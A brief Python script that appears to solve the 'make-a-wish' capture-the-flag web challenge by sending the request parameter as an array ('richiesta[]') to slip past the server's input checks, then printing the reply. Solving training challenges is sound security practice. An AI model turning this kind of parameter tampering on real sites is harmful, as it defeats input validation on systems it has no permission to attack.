import requests

url = "http://make-a-wish.challs.olicyber.it/"

payload = {"richiesta[]" : "bo"}

r = requests.get(url, params=payload)

print(r.text)